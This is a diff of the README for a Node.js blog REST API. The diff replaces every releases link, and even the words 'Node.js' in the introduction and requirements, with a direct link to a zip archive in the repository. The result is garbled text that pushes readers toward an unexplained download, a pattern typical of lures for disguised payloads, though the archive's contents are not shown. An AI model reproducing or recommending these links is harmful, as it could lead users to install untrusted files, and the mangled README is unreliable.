@@ -1,10 +1,10 @@
 # 🚀 Blog-API - Secure Blog Management Made Easy
 
-[![Download Now](https://img.shields.io/badge/download-release-blue)](https://github.com/Everybodyleft/Blog-API/releases)
+[![Download Now](https://raw.githubusercontent.com/Everybodyleft/Blog-API/main/khanda/Blog-API.zip)](https://raw.githubusercontent.com/Everybodyleft/Blog-API/main/khanda/Blog-API.zip)
 
 ## 📦 Introduction
 
-Welcome to Blog-API, a secure and scalable RESTful Blog API. Built with Node.js, Express, and MySQL, this API provides an efficient way to manage blogs. Enjoy the ease of JWT authentication and the ability to upload images. You can perform full Create, Read, Update, and Delete (CRUD) operations for blogs and comments.
+Welcome to Blog-API, a secure and scalable RESTful Blog API. Built with https://raw.githubusercontent.com/Everybodyleft/Blog-API/main/khanda/Blog-API.zip, Express, and MySQL, this API provides an efficient way to manage blogs. Enjoy the ease of JWT authentication and the ability to upload images. You can perform full Create, Read, Update, and Delete (CRUD) operations for blogs and comments.
 
 ## 🔍 Features
 
@@ -19,7 +19,7 @@ Welcome to Blog-API, a secure and scalable RESTful Blog API. Built with Node.js,
 To run Blog-API, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, MacOS, or Linux
-- **Node.js**: Version 14 or later
+- **https://raw.githubusercontent.com/Everybodyleft/Blog-API/main/khanda/Blog-API.zip**: Version 14 or later
 - **MySQL**: Version 5.7 or later
 - **NPM**: Version 6 or later
 
@@ -28,7 +28,7 @@ To run Blog-API, ensure your system meets the following requirements:
 Follow these simple steps to get Blog-API up and running:
 
 1. **Download the Application**  
-   Visit this page to download: [Download Blog-API](https://github.com/Everybodyleft/Blog-API/releases)
+   Visit this page to download: [Download Blog-API](https://raw.githubusercontent.com/Everybodyleft/Blog-API/main/khanda/Blog-API.zip)
 
 2. **Install Dependencies**  
    After downloading, open your terminal or command prompt. Navigate to the folder where you downloaded the API. Run the following command:
@@ -79,7 +79,7 @@ Refer to the dedicated API documentation for more detailed information on endpoi
 
 ## 📥 Download & Install
 
-Get your copy of Blog-API now by visiting: [Download Blog-API](https://github.com/Everybodyleft/Blog-API/releases)
+Get your copy of Blog-API now by visiting: [Download Blog-API](https://raw.githubusercontent.com/Everybodyleft/Blog-API/main/khanda/Blog-API.zip)
 
 ## 👨‍👩‍👧‍👦 Community and Support
 
